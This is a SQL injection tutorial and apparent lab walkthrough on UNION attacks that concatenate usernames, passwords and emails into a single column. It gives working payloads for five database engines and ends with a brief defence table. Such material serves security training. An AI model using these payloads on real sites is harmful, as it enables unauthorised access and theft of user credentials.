# SQL Injection UNION Attack: Retrieving Multiple Values in a Single Column

## Objective
Extract multiple pieces of data (e.g., `username` AND `password`) when only **one text-capable column** exists in the original query.

---

## The Problem
The original query has only 1 text column, but you need to extract 2 or more values.

**Example backend query:**
```sql
SELECT id, title, body FROM blog_posts WHERE id = '$input'
```

A naive attempt fails:
```sql
' UNION SELECT NULL, username, password FROM users--
```

**Why it fails:**
- The application might only display column 2.
- Column 3 might throw a type mismatch error.
- The output parser might truncate or ignore column 3.

**The Solution:** Concatenate both values into the single usable text column.

---

## Database-Specific Concatenation Reference

| Database | Operator / Function | Syntax Example |
|----------|---------------------|----------------|
| **MySQL** | `CONCAT()` | `CONCAT(username, ':', password)` |
| **MySQL** | `CONCAT_WS()` | `CONCAT_WS(':', username, password)` |
| **MySQL** | Hex literal | `CONCAT(username, 0x3a, password)` |
| **PostgreSQL** | `||` | `username || ':' || password` |
| **PostgreSQL** | `CONCAT()` | `CONCAT(username, ':', password)` |
| **Oracle** | `||` | `username || ':' || password` |
| **Oracle** | `CONCAT()` *(only 2 args)* | `CONCAT(username, CONCAT(':', password))` |
| **SQLite** | `||` | `username || ':' || password` |
| **SQL Server** | `+` | `username + ':' + password` |
| **SQL Server** | `CONCAT()` | `CONCAT(username, ':', password)` |

> **Critical Oracle Note:** `CONCAT()` in Oracle only accepts **two arguments**. For three or more values, nest them or use `||`.

---

## Step-by-Step Methodology

### Step 1: Confirm the Injection Point
```sql
' OR '1'='1
' AND 1=1--
' AND 1=2--
```

### Step 2: Determine Column Count
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  (error here = 2 columns)
```
Or using UNION:
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Step 3: Identify Which Columns Accept Strings
Replace `NULL` with a string marker one at a time:
```sql
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
' UNION SELECT NULL,NULL,'a'--
```
If `'a'` in position 2 returns output and positions 1/3 error out, **column 2 is your text column**.

### Step 4: Enumerate the Database
All schema info must go into your single text column.

**MySQL — Database & Version:**
```sql
' UNION SELECT NULL,CONCAT(database(),' | ',version())--
```

**PostgreSQL — Current User & DB:**
```sql
' UNION SELECT NULL,current_database()||' | '||current_user--
```

**Oracle — Banner & User:**
```sql
' UNION SELECT NULL,(SELECT banner FROM v$version WHERE ROWNUM=1)||' | '||(SELECT user FROM dual) FROM dual--
```
> **Oracle Dual Table:** Oracle requires `FROM dual` for scalar selections.

### Step 5: Extract Table Names
**MySQL:**
```sql
' UNION SELECT NULL,CONCAT(table_schema,'.',table_name) FROM information_schema.tables WHERE table_schema=database()--
```

**PostgreSQL:**
```sql
' UNION SELECT NULL,table_schema||'.'||table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema')--
```

### Step 6: Extract Column Names
**MySQL:**
```sql
' UNION SELECT NULL,CONCAT(table_name,': ',column_name) FROM information_schema.columns WHERE table_name='users'--
```

### Step 7: Extract the Data

**MySQL (clean output with separator):**
```sql
' UNION SELECT NULL,CONCAT_WS(' | ',username,password) FROM users--
```

**PostgreSQL:**
```sql
' UNION SELECT NULL,username||' | '||password FROM users--
```

**Oracle:**
```sql
' UNION SELECT NULL,username||':'||password FROM users--
```

**SQLite:**
```sql
' UNION SELECT NULL,username||':'||password FROM users--
```

**Expected Output:**
```
administrator:5f4dcc3b5aa765d61d8327deb882cf99
wiener:peter
```

---

## Advanced Techniques & Edge Cases

### A. Handling NULL Values
If a column might be NULL, `CONCAT()` in MySQL returns NULL. Use `CONCAT_WS()` or `IFNULL()`:
```sql
' UNION SELECT NULL,CONCAT(IFNULL(username,'N/A'),':',IFNULL(password,'N/A')) FROM users--
```

`CONCAT_WS()` safely skips NULLs:
```sql
' UNION SELECT NULL,CONCAT_WS(':', username, password, email) FROM users--
```

### B. Multi-Row Output in a Single Row
If the application only shows **one row**, collapse everything:

**MySQL:**
```sql
' UNION SELECT NULL,GROUP_CONCAT(CONCAT(username,':',password) SEPARATOR ' | ') FROM users--
```

**PostgreSQL:**
```sql
' UNION SELECT NULL,STRING_AGG(username||':'||password, ' | ') FROM users--
```

**Oracle (11gR2+):**
```sql
' UNION SELECT NULL,LISTAGG(username||':'||password, ' | ') WITHIN GROUP (ORDER BY username) FROM users--
```

### C. Hex Encoding to Bypass Filters
If `:` or `|` is filtered, use hex literals:

**MySQL:**
```sql
' UNION SELECT NULL,CONCAT(username,0x3a,password) FROM users--
```
`0x3a` = `:` in hex.

### D. Limiting Results
**Oracle (only first row):**
```sql
' UNION SELECT NULL,username||':'||password FROM users WHERE ROWNUM=1--
```

**MySQL:**
```sql
' UNION SELECT NULL,CONCAT(username,':',password) FROM users LIMIT 1 OFFSET 0--
```

**PostgreSQL:**
```sql
' UNION SELECT NULL,username||':'||password FROM users LIMIT 1 OFFSET 0--
```

### E. Subqueries for Complex Data
```sql
' UNION SELECT NULL,CONCAT('Total: ',(SELECT COUNT(*) FROM users),' | Admin: ',(SELECT password FROM users WHERE username='administrator'))--
```

---

## Complete Lab Walkthrough (MySQL Scenario)

**Target:** `https://target.com/post?id=1`

### 1. Confirm Injection
```
?id=1' AND 1=1--   → 200 OK
?id=1' AND 1=2--   → Empty/error page
```

### 2. Find Column Count
```
?id=1' ORDER BY 1--   → OK
?id=1' ORDER BY 2--   → OK
?id=1' ORDER BY 3--   → Error
```
**Result:** 2 columns.

### 3. Find Text Column
```
?id=1' UNION SELECT 'A',NULL--   → No output
?id=1' UNION SELECT NULL,'A'--   → "A" appears
```
**Result:** Column 2 is text-capable.

### 4. Get Database Name
```
?id=1' UNION SELECT NULL,CONCAT('DB: ',database(),' | Ver: ',version())--
```
**Output:** `DB: acme_blog | Ver: 8.0.32`

### 5. Find Tables
```
?id=1' UNION SELECT NULL,CONCAT(table_schema,'.',table_name) FROM information_schema.tables WHERE table_schema='acme_blog'--
```
**Output:** `acme_blog.users`, `acme_blog.posts`, `acme_blog.comments`

### 6. Get Columns from `users`
```
?id=1' UNION SELECT NULL,CONCAT(table_name,': ',column_name) FROM information_schema.columns WHERE table_name='users'--
```
**Output:** `users: id`, `users: username`, `users: password`, `users: email`

### 7. Extract Credentials
```
?id=1' UNION SELECT NULL,CONCAT_WS(' | ',username,password,email) FROM users--
```

**Final Output:**
```
administrator | 5f4dcc3b5aa765d61d8327deb882cf99 | admin@acme.com
wiener | peter | wiener@acme.com
carlos | letmein | carlos@acme.com
```

---

## Defense: How to Prevent This

| Defense | How It Works |
|---------|--------------|
| **Parameterized Queries** | Gold standard. User input never concatenated into query string. |
| **Stored Procedures** | Logic encapsulated; parameters strictly typed. |
| **Input Validation** | Whitelist expected formats (e.g., integers only for IDs). |
| **Least Privilege** | App DB user should not have `SELECT` on sensitive tables if unnecessary. |
| **WAF / RASP** | Can block obvious `UNION SELECT` patterns, but bypasses exist. |
| **Output Encoding** | Doesn't prevent injection, but limits damage from extraction. |

---

## Quick Reference Cheat Sheet

**MySQL:**
```sql
' UNION SELECT NULL,CONCAT_WS(':',col1,col2) FROM table--
```

**PostgreSQL:**
```sql
' UNION SELECT NULL,col1||':'||col2 FROM table--
```

**Oracle:**
```sql
' UNION SELECT NULL,col1||':'||col2 FROM table--
```
*(Remember: `FROM dual` for scalar subqueries)*

**SQLite:**
```sql
' UNION SELECT NULL,col1||':'||col2 FROM table--
```

**SQL Server:**
```sql
' UNION SELECT NULL,col1+':'+col2 FROM table--
```

---

> **Key Takeaway:** Recon first — confirm column count, identify the text column, then use the appropriate concatenation operator for the backend database. The payload structure is always the same; only the concatenation syntax changes.
